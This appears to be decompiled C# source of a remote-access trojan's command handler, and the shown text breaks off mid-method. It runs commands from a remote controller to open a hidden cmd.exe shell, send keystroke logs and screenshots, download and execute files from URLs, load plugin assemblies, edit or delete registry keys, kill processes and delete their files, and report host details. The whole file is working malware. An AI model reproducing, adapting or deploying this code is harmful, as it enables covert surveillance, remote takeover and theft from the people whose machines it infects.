using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace XV
{
    internal sealed class MHand
    {
        public static Spy spy = null;
        private static string lastcap = "";

        public static void DRegValue(string n)
        {
            try
            {
                OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RegKey, true).DeleteValue(n);
            }
            catch (Exception expr_2C)
            {
                ProjectData.SetProjectError(expr_2C);
                ProjectData.ClearProjectError();
            }
        }

        public static object SRegValue(string n, string t)
        {
            object result;
            try
            {
                OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RegKey).SetValue(n, t);
                result = true;
            }
            catch (Exception expr_33)
            {
                ProjectData.SetProjectError(expr_33);
                result = false;
                ProjectData.ClearProjectError();
            }
            return result;
        }

        public static string RandomStr(int c)
        {
            VBMath.Randomize();
            var random = new Random();
            string text = "";
            string text2 = "abcdefghijklmnopqrstuvwxyz";
            checked
            {
                for (int i = 1; i <= c; i++)
                {
                    text += Conversions.ToString(text2[random.Next(0, text2.Length)]);
                }
                return text;
            }
        }

        public static byte[] ZIP(byte[] B, ref bool CM)
        {
            checked
            {
                if (CM)
                {
                    var memoryStream = new MemoryStream();
                    var gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, true);
                    gZipStream.Write(B, 0, B.Length);
                    gZipStream.Dispose();
                    memoryStream.Position = 0L;
                    var array = new byte[(int) memoryStream.Length + 1];
                    memoryStream.Read(array, 0, array.Length);
                    memoryStream.Dispose();
                    return array;
                }
                var memoryStream2 = new MemoryStream(B);
                var gZipStream2 = new GZipStream(memoryStream2, CompressionMode.Decompress);
                var array2 = new byte[4];
                memoryStream2.Position = memoryStream2.Length - 5L;
                memoryStream2.Read(array2, 0, 4);
                int num = BitConverter.ToInt32(array2, 0);
                memoryStream2.Position = 0L;
                var array3 = new byte[num - 1 + 1];
                gZipStream2.Read(array3, 0, num);
                gZipStream2.Dispose();
                memoryStream2.Dispose();
                return array3;
            }
        }

        public static object Plugin(byte[] ByteOfPlugin, string ClassName)
        {
            Assembly assembly = Assembly.Load(ByteOfPlugin);
            Module[] modules = assembly.GetModules();
            checked
            {
                for (int i = 0; i < modules.Length; i++)
                {
                    Module module = modules[i];
                    Type[] types = module.GetTypes();
                    for (int j = 0; j < types.Length; j++)
                    {
                        Type type = types[j];
                        if (type.FullName.EndsWith("." + ClassName))
                        {
                            return module.Assembly.CreateInstance(type.FullName);
                        }
                    }
                }
                return null;
            }
        }

        private static void ConsoleOut(object a, object e)
        {
            try
            {
                string arg_4A_0 = "rs";
                string arg_4A_1 = OK.spliter;
                string text =
                    Conversions.ToString(NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null));
                string arg_4A_2 = OK.ToBase64(ref text);
                NewLateBinding.LateSetComplex(e, null, "Data", new object[]
                {
                    text
                }, null, null, true, false);
                OK.Send(arg_4A_0 + arg_4A_1 + arg_4A_2);
            }
            catch (Exception expr_57)
            {
                ProjectData.SetProjectError(expr_57);
                ProjectData.ClearProjectError();
            }
        }

        private static void ProgressExit()
        {
            try
            {
                OK.Send("rsc");
            }
            catch (Exception expr_0D)
            {
                ProjectData.SetProjectError(expr_0D);
                ProjectData.ClearProjectError();
            }
        }

        /// proc message:
        /// proc|~   return pid|CurrentProcess() ~|process count
        public static void Ind(byte[] b)
        {
            string[] array = Strings.Split(OK.GetString( b), OK.spliter, -1, CompareMethod.Binary);
            
            checked
            {
                try
                {
                    string left = array[0];
                    if (Operators.CompareString(left, "proc", false) == 0)
                    {
                        string left2 = array[1];
                       
                        if (Operators.CompareString(left2, "~", false) == 0)
                        {
                            proc();
                        }
                        else
                        {
                            if (Operators.CompareString(left2, "k", false) == 0)
                            {
                                Pk(array);
                            }
                            else
                            {
                                if (Operators.CompareString(left2, "kd", false) == 0)
                                {
                                    Pkd(array);
                                }
                                else
                                {
                                    if (Operators.CompareString(left2, "re", false) == 0)
                                    {
                                        Pre(array);
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        if (Operators.CompareString(left, "rss", false) == 0)
                        {
                            StartCmd();
                        }
                        else
                        {
                            if (Operators.CompareString(left, "rs", false) == 0)
                            {
                                WriteToCmd(array);
                            }
                            else
                            {
                                if (Operators.CompareString(left, "rsc", false) == 0)
                                {
                                    KillCmd();
                                }
                                else
                                {
                                    if (Operators.CompareString(left, "kl", false) == 0)
                                    {
                                        SendLog();
                                    }
                                    else
                                    {
                                        if (Operators.CompareString(left, "inf", false) == 0)
                                        {
                                            GetInfo();
                                        }
                                        else
                                        {
                                            if (Operators.CompareString(left, "prof", false) == 0)
                                            {
                                                Reg(array);
                                            }
                                            else
                                            {
                                                if (Operators.CompareString(left, "rn", false) == 0)
                                                {
                                                    Downloadfile(array);
                                                }
                                                else
                                                {
                                                    if (Operators.CompareString(left, "inv", false) == 0)
                                                    {
                                                        OK.Send("bla");
                                                        string text10 = OK.GRegValue(array[1]);
                                                        byte[] array4;
                                                        if (text10.Length > 0)
                                                        {
                                                            array4 = Convert.FromBase64String(text10);
                                                            OK.Send(string.Concat(new[]
                                                            {
                                                                "pl", OK.spliter,
                                                                array[1], OK.spliter,
                                                                Conversions.ToString(0)
                                                            }));
                                                        }
                                                        else
                                                        {
                                                            if (array[3].Length == 1)
                                                            {
                                                                OK.Send(string.Concat(new[]
                                                                {
                                                                    "pl", OK.spliter,
                                                                    array[1], OK.spliter,
                                                                    "False"
                                                                }));
                                                                return;
                                                            }
                                                            byte[] arg_DB5_0 = Convert.FromBase64String(array[3]);
                                                            bool flag = false;
                                                            array4 = ZIP(arg_DB5_0, ref flag);
                                                            if (
                                                                Conversions.ToBoolean(SRegValue(array[1],
                                                                    Convert.ToBase64String(array4))))
                                                            {
                                                                OK.Send(string.Concat(new[]
                                                                {
                                                                    "pl", OK.spliter,
                                                                    array[1], OK.spliter,
                                                                    Conversions.ToString(0)
                                                                }));
                                                            }
                                                        }
                                                        object objectValue =
                                                            RuntimeHelpers.GetObjectValue(Plugin(array4, "A"));
                                                        NewLateBinding.LateSet(objectValue, null, "h", new object[]
                                                        {
                                                            OK.ip
                                                        }, null, null);
                                                        NewLateBinding.LateSet(objectValue, null, "p", new object[]
                                                        {
                                                            OK.port
                                                        }, null, null);
                                                        NewLateBinding.LateSet(objectValue, null, "osk", new object[]
                                                        {
                                                            array[2]
                                                        }, null, null);
                                                        NewLateBinding.LateCall(objectValue, null, "start",
                                                            new object[0], null, null, null, true);
                                                        while (
                                                            !Conversions.ToBoolean(Operators.OrObject(!OK.ON,
                                                                Operators.CompareObjectEqual(
                                                                    NewLateBinding.LateGet(objectValue, null, "Off",
                                                                        new object[0], null, null, null), true, false))))
                                                        {
                                                            Thread.Sleep(1);
                                                        }
                                                        NewLateBinding.LateSet(objectValue, null, "off", new object[]
                                                        {
                                                            true
                                                        }, null, null);
                                                    }
                                                    else
                                                    {
                                                        if (Operators.CompareString(left, "ret", false) == 0)
                                                        {
                                                            OK.Send("bla");
                                                            string text11 = OK.GRegValue(array[1]);
                                                            byte[] array5;
                                                            if (text11.Length > 0)
                                                            {
                                                                array5 = Convert.FromBase64String(text11);
                                                                OK.Send(string.Concat(new[]
                                                                {
                                                                    "pl", OK.spliter,
                                                                    array[1], OK.spliter,
                                                                    Conversions.ToString(0)
                                                                }));
                                                            }
                                                            else
                                                            {
                                                                if (array[2].Length == 1)
                                                                {
                                                                    OK.Send(string.Concat(new[]
                                                                    {
                                                                        "pl", OK.spliter,
                                                                        array[1], OK.spliter,
                                                                        "True"
                                                                    }));
                                                                    return;
                                                                }
                                                                byte[] arg_FEB_0 = Convert.FromBase64String(array[2]);
                                                                bool flag = false;
                                                                array5 = ZIP(arg_FEB_0, ref flag);
                                                                if (
                                                                    Conversions.ToBoolean(SRegValue(array[1],
                                                                        Convert.ToBase64String(array5))))
                                                                {
                                                                    OK.Send(string.Concat(new[]
                                                                    {
                                                                        "pl", OK.spliter,
                                                                        array[1], OK.spliter,
                                                                        Conversions.ToString(0)
                                                                    }));
                                                                }
                                                            }
                                                            object objectValue2 =
                                                                RuntimeHelpers.GetObjectValue(Plugin(array5, "A"));
                                                            var array3 = new string[5];
                                                            array3[0] = "ret";
                                                            array3[1] = OK.spliter;
                                                            array3[2] = array[1];
                                                            array3[3] = OK.spliter;
                                                            string[] arg_10AD_0 = array3;
                                                            int arg_10AD_1 = 4;
                                                            string text8 =
                                                                Conversions.ToString(NewLateBinding.LateGet(
                                                                    objectValue2, null, "GT", new object[0], null, null,
                                                                    null));
                                                            arg_10AD_0[arg_10AD_1] = OK.ToBase64(ref text8);
                                                            OK.Send(string.Concat(array3));
                                                        }
                                                        else
                                                        {
                                                            if (Operators.CompareString(left, "CAP", false) == 0)
                                                            {
                                                                int arg_10F9_0 = Screen.PrimaryScreen.Bounds.Width;
                                                                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                                                                var bitmap = new Bitmap(arg_10F9_0, bounds.Height);
                                                                Graphics graphics = Graphics.FromImage(bitmap);
                                                                Graphics arg_112B_0 = graphics;
                                                                int arg_112B_1 = 0;
                                                                int arg_112B_2 = 0;
                                                                int arg_112B_3 = 0;
                                                                int arg_112B_4 = 0;
                                                                var size = new Size(bitmap.Width, bitmap.Height);
                                                                arg_112B_0.CopyFromScreen(arg_112B_1, arg_112B_2,
                                                                    arg_112B_3, arg_112B_4, size,
                                                                    CopyPixelOperation.SourceCopy);
                                                                try
                                                                {
                                                                    Cursor arg11520 = Cursors.Default;
                                                                    Graphics arg11521 = graphics;
                                                                    Point arg114B1 = Cursor.Position;
                                                                    size = new Size(32, 32);
                                                                    bounds = new Rectangle(arg114B1, size);
                                                                    arg11520.Draw(arg11521, bounds);
                                                                }
                                                                catch (Exception expr_1159)
                                                                {
                                                                    ProjectData.SetProjectError(expr_1159);
                                                                    ProjectData.ClearProjectError();
                                                                }
                                                                graphics.Dispose();
                                                                var memoryStream = new MemoryStream();
                                                                string text8 = "CAP" + OK.spliter;
                                                                b = OK.GetBytes( text8);
                                                                memoryStream.Write(b, 0, b.Length);
                                                                var memoryStream2 = new MemoryStream();
                                                                var callbackData = (IntPtr) 0;
                                                                bitmap.GetThumbnailImage(
                                                                    Conversions.ToInteger(array[1]),
                                                                    Conversions.ToInteger(array[2]), null, callbackData)
                                                                    .Save(memoryStream2, ImageFormat.Jpeg);
                                                                string mD5Hash = GetMd5Hash(memoryStream2.ToArray());
                                                                if (Operators.CompareString(mD5Hash, lastcap, false) !=
                                                                    0)
                                                                {
                                                                    lastcap = mD5Hash;
                                                                    memoryStream.Write(memoryStream2.ToArray(), 0,
                                                                        (int) memoryStream2.Length);
                                                                }
                                                                else
                                                                {
                                                                    memoryStream.WriteByte(0);
                                                                }
                                                                OK.Sendbytes(memoryStream.ToArray());
                                                                memoryStream.Dispose();
                                                                memoryStream2.Dispose();
                                                                bitmap.Dispose();
                                                            }
                                                            else
                                                            {
                                                                if (Operators.CompareString(left, "P", false) == 0)
                                                                {
                                                                    OK.Send("P");
                                                                }
                                                                else
                                                                {
                                                                    if (Operators.CompareString(left, "un", false) == 0)
                                                                    {
                                                                        string left4 = array[1];
                                                                        if (
                                                                            Operators.CompareString(left4, "~", false) ==
                                                                            0)
                                                                        {
                                                                            Uninstall();
                                                                        }
                                                                        else
                                                                        {
                                                                            if (
                                                                                Operators.CompareString(left4, "!",
                                                                                    false) == 0)
                                                                            {
                                                                                Nm.pr(0);
                                                                                ProjectData.EndApp();
                                                                            }
                                                                            else
                                                                            {
                                                                                if (
                                                                                    Operators.CompareString(left4, "@",
                                                                                        false) == 0)
                                                                                {
                                                                                    Nm.pr(0);
                                                                                    Process.Start(OK.AppFileInfo.FullName);
                                                                                    ProjectData.EndApp();
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                    else
                                                                    {
                                                                        if (
                                                                            Operators.CompareString(left, "up", false) ==
                                                                            0)
                                                                        {
                                                                            byte[] bytes2 = null;
                                                                            if (!array[1].ToLower().StartsWith("http"))
                                                                            {
                                                                                try
                                                                                {
                                                                                    byte[] arg_130E_0 =
                                                                                        Convert.FromBase64String(
                                                                                            array[1]);
                                                                                    bool flag = false;
                                                                                    bytes2 = ZIP(arg_130E_0, ref flag);
                                                                                    goto IL_139B;
                                                                                }
                                                                                catch (Exception expr_131A)
                                                                                {
                                                                                    ProjectData.SetProjectError(
                                                                                        expr_131A);
                                                                                    OK.Send("MSG" + OK.spliter + "Update ERROR");
                                                                                    OK.Send("bla");
                                                                                    ProjectData.ClearProjectError();
                                                                                    return;
                                                                                }
                                                                            }
                                                                            var webClient2 = new WebClient();
                                                                            try
                                                                            {
                                                                                bytes2 =
                                                                                    webClient2.DownloadData(array[1]);
                                                                            }
                                                                            catch (Exception expr_1365)
                                                                            {
                                                                                ProjectData.SetProjectError(expr_1365);
                                                                                OK.Send("MSG" + OK.spliter + "Update ERROR");
                                                                                OK.Send("bla");
                                                                                ProjectData.ClearProjectError();
                                                                                return;
                                                                            }
                                                                            IL_139B:
                                                                            OK.Send("bla");
                                                                            OK.F.Registry.CurrentUser.SetValue("di", "");
                                                                            string text12 =
                                                                                Interaction.Environ("temp") + "\\" +
                                                                                RandomStr(10) + ".exe";
                                                                            File.WriteAllBytes(text12, bytes2);
                                                                            OK.Send("MSG" + OK.spliter + "Updating To " +
                                                                                    new FileInfo(text12).Name);
                                                                            Process.Start(text12,
                                                                                "UP:" +
                                                                                Conversions.ToString(
                                                                                    Process.GetCurrentProcess().Id));
                                                                            int num5 = 0;
                                                                            do
                                                                            {
                                                                                Thread.Sleep(10);
                                                                                if (
                                                                                    Operators
                                                                                        .ConditionalCompareObjectEqual(OK.F.Registry.CurrentUser
                                                                                            .GetValue("di", ""), "!",
                                                                                            false))
                                                                                {
                                                                                    Uninstall();
                                                                                }
                                                                                num5++;
                                                                            } while (num5 <= 500);
                                                                        }
                                                                        else
                                                                        {
                                                                            if (
                                                                                Operators.CompareString(left, "RG",
                                                                                    false) == 0)
                                                                            {
                                                                                RegistryKey key = GetKey(array[2]);
                                                                                string left5 = array[1];
                                                                                if (
                                                                                    Operators.CompareString(left5, "~",
                                                                                        false) == 0)
                                                                                {
                                                                                    string str = string.Concat(new[]
                                                                                    {
                                                                                        "RG", OK.spliter,
                                                                                        "~", OK.spliter,
                                                                                        array[2], OK.spliter
                                                                                    });
                                                                                    string text13 = "";
                                                                                    string[] subKeyNames =
                                                                                        key.GetSubKeyNames();
                                                                                    for (int m = 0;
                                                                                        m < subKeyNames.Length;
                                                                                        m++)
                                                                                    {
                                                                                        string text14 = subKeyNames[m];
                                                                                        if (!text14.Contains("\\"))
                                                                                        {
                                                                                            text13 = text13 + text14 + OK.spliter;
                                                                                        }
                                                                                    }
                                                                                    string[] valueNames =
                                                                                        key.GetValueNames();
                                                                                    for (int n = 0;
                                                                                        n < valueNames.Length;
                                                                                        n++)
                                                                                    {
                                                                                        string text15 = valueNames[n];
                                                                                        text13 = string.Concat(new[]
                                                                                        {
                                                                                            text13,
                                                                                            text15,
                                                                                            "/",
                                                                                            key.GetValueKind(text15)
                                                                                                .ToString(),
                                                                                            "/",
                                                                                            key.GetValue(text15, "")
                                                                                                .ToString(),
                                                                                            OK.spliter
                                                                                        });
                                                                                    }
                                                                                    OK.Send(str + text13);
                                                                                }
                                                                                else
                                                                                {
                                                                                    if (
                                                                                        Operators.CompareString(left5,
                                                                                            "!", false) == 0)
                                                                                    {
                                                                                        key.SetValue(array[3], array[4],
                                                                                            (RegistryValueKind)
                                                                                                Conversions.ToInteger(
                                                                                                    array[5]));
                                                                                    }
                                                                                    else
                                                                                    {
                                                                                        if (
                                                                                            Operators.CompareString(
                                                                                                left5, "@", false) == 0)
                                                                                        {
                                                                                            key.DeleteValue(array[3],
                                                                                                false);
                                                                                        }
                                                                                        else
                                                                                        {
                                                                                            if (
                                                                                                Operators.CompareString(
                                                                                                    left5, "#", false) ==
                                                                                                0)
                                                                                            {
                                                                                                key.CreateSubKey(
                                                                                                    array[3]);
                                                                                            }
                                                                                            else
                                                                                            {
                                                                                                if (
                                                                                                    Operators
                                                                                                        .CompareString(
                                                                                                            left5, "$",
                                                                                                            false) == 0)
                                                                                                {
                                                                                                    key.DeleteSubKeyTree
                                                                                                        (array[3]);
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                catch (Exception expr_1665)
                {
                    ProjectData.SetProjectError(expr_1665);
                    Exception ex4 = expr_1665;
                    try
                    {
                        OK.Send(string.Concat(new[]
                        {
                            "ER", OK.spliter,
                            array[0], OK.spliter,
                            ex4.Message
                        }));
                    }
                    catch (Exception expr_16B1)
                    {
                        ProjectData.SetProjectError(expr_16B1);
                        ProjectData.ClearProjectError();
                    }
                    ProjectData.ClearProjectError();
                }
            }
        }

        private static bool Downloadfile(string[] array)
        {
            byte[] bytes = null;
            if (!array[2].ToLower().StartsWith("http"))
            {
                try
                {
                    byte[] s = Convert.FromBase64String(array[2]);
                    bool flag = false;
                    bytes = ZIP(s, ref flag);
                    goto IL_C4D;
                }
                catch (Exception expr_BCC)
                {
                    ProjectData.SetProjectError(expr_BCC);
                    OK.Send("MSG" + OK.spliter + "Execute ERROR");
                    OK.Send("bla");
                    ProjectData.ClearProjectError();
                    return true;
                }
            }
            var webClient = new WebClient();
            try
            {
                bytes = webClient.DownloadData(array[2]);
            }
            catch (Exception expr_C17)
            {
                ProjectData.SetProjectError(expr_C17);
                OK.Send("MSG" + OK.spliter + "Download ERROR");
                OK.Send("bla");
                ProjectData.ClearProjectError();
                return true;
            }
            IL_C4D:
            OK.Send("bla");
            string text9 = string.Concat(new[]
            {
                Interaction.Environ("temp"),
                "\\",
                RandomStr(10),
                ".",
                array[1]
            });
            File.WriteAllBytes(text9, bytes);
            Process.Start(text9);
            OK.Send("MSG" + OK.spliter + "Executed As " + new FileInfo(text9).Name);
            return false;
        }

        private static void Reg(string[] array)
        {
            string left3 = array[1];
            if (Operators.CompareString(left3, "~", false) == 0)
            {
                SRegValue(array[2], array[3]);
            }
            else
            {
                if (Operators.CompareString(left3, "!", false) == 0)
                {
                    SRegValue(array[2], array[3]);
                    OK.Send(string.Concat(new[]
                    {
                        "getvalue", OK.spliter,
                        array[1], OK.spliter, OK.GRegValue(array[1])
                    }));
                }
                else
                {
                    if (Operators.CompareString(left3, "@", false) == 0)
                    {
                        DRegValue(array[2]);
                    }
                }
            }
        }

        private static void GetInfo()
        {
            string text7 = "inf" + OK.spliter;
            if (Operators.CompareString(OK.GRegValue("vn"), "", false) == 0)
            {
                string arg_A09_0 = text7;
                string text3 = OK.FromBase64(ref OK.VN) + "_" + Nm.HardDiskSerial();
                text7 = arg_A09_0 + OK.ToBase64(ref text3) + OK.spliter;
            }
            else
            {
                string arg_A44_0 = text7;
                string text3 = OK.GRegValue("vn");
                string text8 = OK.FromBase64(ref text3) + "_" + Nm.HardDiskSerial();
                text7 = arg_A44_0 + OK.ToBase64(ref text8) + OK.spliter;
            }
            text7 = string.Concat(new[]
            {
                text7, OK.ip,
                ":", OK.port, OK.spliter
            });
            text7 = text7 + OK.TEMP + OK.spliter;
            text7 = text7 + OK.EXE + OK.spliter;
            text7 += Process.GetCurrentProcess().ProcessName;
            OK.Send(text7);
        }

        private static void SendLog()
        {
            OK.Send("kl" + OK.spliter + OK.ToBase64(ref spy.Logs));
        }

        private static void KillCmd()
        {
            try
            {
                OK.Pro.Kill();
            }
            catch (Exception expr_952)
            {
                ProjectData.SetProjectError(expr_952);
                ProjectData.ClearProjectError();
            }
            OK.Pro = null;
        }

        private static void WriteToCmd(string[] array)
        {
            OK.Pro.StandardInput.WriteLine(OK.FromBase64(ref array[1]));
        }

        private static void StartCmd()
        {
            try
            {
                OK.Pro.Kill();
            }
            catch (Exception expr_7FE)
            {
                ProjectData.SetProjectError(expr_7FE);
                ProjectData.ClearProjectError();
            }
            OK.Pro = new Process();
            OK.Pro.StartInfo.RedirectStandardOutput = true;
            OK.Pro.StartInfo.RedirectStandardInput = true;
            OK.Pro.StartInfo.RedirectStandardError = true;
            OK.Pro.StartInfo.FileName = "cmd.exe";
            OK.Pro.OutputDataReceived += ConsoleOut;
            OK.Pro.ErrorDataReceived += ConsoleOut;
            OK.Pro.Exited += delegate { ProgressExit(); };
            OK.Pro.StartInfo.UseShellExecute = false;
            OK.Pro.StartInfo.CreateNoWindow = true;
            OK.Pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            OK.Pro.EnableRaisingEvents = true;
            OK.Send("rss");
            OK.Pro.Start();
            OK.Pro.BeginErrorReadLine();
            OK.Pro.BeginOutputReadLine();
        }

        private static void Pre(string[] array)
        {
            int arg_65A_0 = 2;
            int num4 = array.Length - 1;
            for (int l = arg_65A_0; l <= num4; l++)
            {
                try
                {
                    string text6 = "";
                    Process process3 =
                        Process.GetProcessById(Conversions.ToInteger(array[l]));
                    try
                    {
                        text6 = process3.MainModule.FileVersionInfo.FileName;
                    }
                    catch (Exception expr_691)
                    {
                        ProjectData.SetProjectError(expr_691);
                        try
                        {
                            text6 = process3.MainModule.FileName;
                        }
                        catch (Exception expr_6A8)
                        {
                            ProjectData.SetProjectError(expr_6A8);
                            text6 = Interaction.Environ("windir") + "\\system32\\" +
                                    process3.ProcessName + ".exe";
                            ProjectData.ClearProjectError();
                        }
                        ProjectData.ClearProjectError();
                    }
                    process3.Kill();
                    OK.Send(string.Concat(new[]
                    {
                        "proc", OK.spliter,
                        "RM", OK.spliter,
                        array[l]
                    }));
                    process3 = null;
                    Process.Start(text6);
                    OK.Send(string.Concat(new[]
                    {
                        "proc", OK.spliter,
                        "ER", OK.spliter,
                        "Started ",
                        text6
                    }));
                }
                catch (Exception expr_77C)
                {
                    ProjectData.SetProjectError(expr_77C);
                    Exception ex3 = expr_77C;
                    OK.Send(string.Concat(new[]
                    {
                        "proc", OK.spliter,
                        "ER", OK.spliter,
                        ex3.Message
                    }));
                    ProjectData.ClearProjectError();
                }
            }
        }

        private static void Pkd(string[] array)
        {
            int arg_4D3_0 = 2;
            int num3 = array.Length - 1;
            for (int k = arg_4D3_0; k <= num3; k++)
            {
                try
                {
                    string text5 = "";
                    Process process2 = Process.GetProcessById(Conversions.ToInteger(array[k]));
                    try
                    {
                        text5 = process2.MainModule.FileVersionInfo.FileName;
                    }
                    catch (Exception expr_50A)
                    {
                        ProjectData.SetProjectError(expr_50A);
                        try
                        {
                            text5 = process2.MainModule.FileName;
                        }
                        catch (Exception expr_521)
                        {
                            ProjectData.SetProjectError(expr_521);
                            ProjectData.ClearProjectError();
                        }
                        ProjectData.ClearProjectError();
                    }
                    process2.Kill();
                    OK.Send(string.Concat(new[]
                    {
                        "proc", OK.spliter,
                        "RM", OK.spliter,
                        array[k]
                    }));
                    process2 = null;
                    Thread.Sleep(2000);
                    File.Delete(text5);
                    OK.Send(string.Concat(new[]
                    {
                        "proc", OK.spliter,
                        "ER", OK.spliter,
                        "Deleted ",
                        text5
                    }));
                }
                catch (Exception expr_5DC)
                {
                    ProjectData.SetProjectError(expr_5DC);
                    Exception ex2 = expr_5DC;
                    OK.Send(string.Concat(new[]
                    {
                        "proc", OK.spliter,
                        "ER", OK.spliter,
                        ex2.Message
                    }));
                    ProjectData.ClearProjectError();
                }
            }
        }

        private static void Pk(string[] array)
        {
            int arg_3F4_0 = 2;
            int num2 = array.Length - 1;
            for (int j = arg_3F4_0; j <= num2; j++)
            {
                try
                {
                    Process.GetProcessById(Conversions.ToInteger(array[j])).Kill();
                    OK.Send(string.Concat(new[]
                    {
                        "proc", OK.spliter,
                        "RM", OK.spliter,
                        array[j]
                    }));
                }
                catch (Exception expr_455)
                {
                    ProjectData.SetProjectError(expr_455);
                    Exception ex = expr_455;
                    OK.Send(string.Concat(new[]
                    {
                        "proc", OK.spliter,
                        "ER", OK.spliter,
                        ex.Message
                    }));
                    ProjectData.ClearProjectError();
                }
            }
        }

        private static void proc()
        {
            
            OK.Send(string.Concat(new[]
            {
                "proc", OK.spliter,
                "pid", OK.spliter,
                Conversions.ToString(Process.GetCurrentProcess().Id)
            }));

            Process[] processes = Process.GetProcesses();
            OK.Send(string.Concat(new[]
            {
                "proc", OK.spliter,
                "~", OK.spliter,
                Conversions.ToString(processes.Length)
            }));
            int num = 0;
            string text = "";
            Process[] array2 = processes;
            int i = 0;
            while (i < array2.Length)
            {
                Process process = array2[i];
                num++;
                try
                {
                    try
                    {
                        string text2 = "";
                        try
                        {
                            string text3 = process.MainModule.FileVersionInfo.FileDescription;
                            text2 = OK.ToBase64(ref text3);
                        }
                        catch (Exception expr_124)
                        {
                            ProjectData.SetProjectError(expr_124);
                            ProjectData.ClearProjectError();
                        }
                        text = string.Concat(new[]
                        {
                            text, OK.spliter,
                            Conversions.ToString(process.Id),
                            ",",
                            process.MainModule.FileName,
                            ",",
                            text2
                        });
                        goto IL_3A0;
                    }
                    catch (Exception expr_18D)
                    {
                        ProjectData.SetProjectError(expr_18D);
                        var array3 = new string[7];
                        array3[0] = text;
                        array3[1] = OK.spliter;
                        array3[2] = Conversions.ToString(process.Id);
                        array3[3] = ",";
                        array3[4] = process.MainModule.FileVersionInfo.FileName;
                        array3[5] = ",";
                        string[] arg_1FE_0 = array3;
                        int arg_1FE_1 = 6;
                        string text3 = process.MainModule.FileVersionInfo.FileDescription;
                        arg_1FE_0[arg_1FE_1] = OK.ToBase64(ref text3);
                        text = string.Concat(array3);
                        ProjectData.ClearProjectError();
                        goto IL_3A0;
                    }
                }
                catch (Exception expr_211)
                {
                    ProjectData.SetProjectError(expr_211);
                    string text4 = "";
                    try
                    {
                        string text3 =
                            FileVersionInfo.GetVersionInfo(Interaction.Environ("windir") +
                                                           "\\system32\\" + process.ProcessName + ".exe")
                                .FileDescription;
                        text4 = OK.ToBase64(ref text3);
                    }
                    catch (Exception expr_256)
                    {
                        ProjectData.SetProjectError(expr_256);
                        ProjectData.ClearProjectError();
                    }
                    if (
                        File.Exists(Interaction.Environ("windir") + "\\system32\\" + process.ProcessName +
                                    ".exe"))
                    {
                        var fileInfo =
                            new FileInfo(Interaction.Environ("windir") + "\\system32\\" +
                                         process.ProcessName + ".exe");
                        text = string.Concat(new[]
                        {
                            text, OK.spliter,
                            Conversions.ToString(process.Id),
                            ",",
                            fileInfo.FullName,
                            ",",
                            text4
                        });
                    }
                    else
                    {
                        text = string.Concat(new[]
                        {
                            text, OK.spliter,
                            Conversions.ToString(process.Id),
                            ",",
                            process.ProcessName,
                            ",",
                            text4
                        });
                    }
                    ProjectData.ClearProjectError();
                    goto IL_3A0;
                }
                goto IL_35D;
                IL_395:
                i++;
                continue;
                IL_35D:
                num = 0;
                var thread = new Thread(a0 => OK.Send(Conversions.ToString(a0)), 1);
                thread.Start("proc" + OK.spliter + "!" + text);
                text = "";
                goto IL_395;
                IL_3A0:
                if (num == 10)
                {
                    goto IL_35D;
                }
                goto IL_395;
            }
            if (Operators.CompareString(text, "", false) != 0)
            {
                OK.Send("proc" + OK.spliter + "!" + text);
            }
        }

        public static string GetMd5Hash(byte[] B)
        {
            var mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
            B = mD5CryptoServiceProvider.ComputeHash(B);
            string text = "";
            byte[] array = B;
            checked
            {
                for (int i = 0; i < array.Length; i++)
                {
                    byte b = array[i];
                    text += b.ToString("x2");
                }
                return text;
            }
        }

        public static RegistryKey GetKey(string key)
        {
            if (key.StartsWith(OK.F.Registry.ClassesRoot.Name))
            {
                string name = key.Replace(OK.F.Registry.ClassesRoot.Name + "\\", "");
                return OK.F.Registry.ClassesRoot.OpenSubKey(name, true);
            }
            if (key.StartsWith(OK.F.Registry.CurrentUser.Name))
            {
                string name = key.Replace(OK.F.Registry.CurrentUser.Name + "\\", "");
                return OK.F.Registry.CurrentUser.OpenSubKey(name, true);
            }
            if (key.StartsWith(OK.F.Registry.LocalMachine.Name))
            {
                string name = key.Replace(OK.F.Registry.LocalMachine.Name + "\\", "");
                return OK.F.Registry.LocalMachine.OpenSubKey(name, true);
            }
            if (key.StartsWith(OK.F.Registry.Users.Name))
            {
                string name = key.Replace(OK.F.Registry.Users.Name + "\\", "");
                return OK.F.Registry.Users.OpenSubKey(name, true);
            }
            return null;
        }

        public static void Uninstall()
        {
            Nm.pr(0);
            try
            {
                OK.F.Registry.CurrentUser.OpenSubKey(OK.AutoRunKeyPath, true).DeleteValue(OK.RegKey, false);
            }
            catch (Exception expr_2D)
            {
                ProjectData.SetProjectError(expr_2D);
                ProjectData.ClearProjectError();
            }
            try
            {
                OK.F.Registry.LocalMachine.OpenSubKey(OK.AutoRunKeyPath, true).DeleteValue(OK.RegKey, false);
            }
            catch (Exception expr_62)
            {
                ProjectData.SetProjectError(expr_62);
                ProjectData.ClearProjectError();
            }
            try
            {
                Interaction.Shell("netsh firewall delete allowedprogram \"" + OK.AppFileInfo.FullName + "\"", AppWinStyle.Hide,
                    false, -1);
            }
            catch (Exception expr_94)
            {
                ProjectData.SetProjectError(expr_94);
                ProjectData.ClearProjectError();
            }
            try
            {
                if (OK.FS != null)
                {
                    OK.FS.Dispose();
                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RegKey + ".exe");
                }
            }
            catch (Exception expr_D4)
            {
                ProjectData.SetProjectError(expr_D4);
                ProjectData.ClearProjectError();
            }
            try
            {
                OK.F.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(OK.RegKey, false);
